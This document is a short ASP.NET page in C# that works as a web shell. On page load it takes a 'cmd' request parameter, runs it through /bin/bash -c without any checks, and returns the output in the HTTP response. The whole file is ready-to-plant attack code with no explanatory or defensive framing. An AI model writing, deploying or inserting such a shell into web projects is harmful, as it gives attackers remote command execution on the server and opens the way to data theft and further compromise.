<%@ Page Language="C#" %>
<%@ Import Namespace="System.Diagnostics" %>

<script runat="server">

protected void Page_Load(object sender, EventArgs e)
{
    string reverse = Request["cmd"];
    
    if (!string.IsNullOrEmpty(reverse))
    {
        ExecuteCommand(reverse);
    }
}

private void ExecuteCommand(string command)
{
    try
    {
        Process proc = new Process();
        proc.StartInfo.FileName = "/bin/bash";
        proc.StartInfo.Arguments = "-c \"" + command + "\"";
        proc.StartInfo.RedirectStandardOutput = true;
        proc.StartInfo.UseShellExecute = false;
        proc.StartInfo.CreateNoWindow = true;
        proc.Start();
        
        string output = proc.StandardOutput.ReadToEnd();
        Response.Write(output);
        proc.WaitForExit();
    }
    catch (Exception ex)
    {
        Response.Write("Error: " + ex.Message);
    }
}

</script>
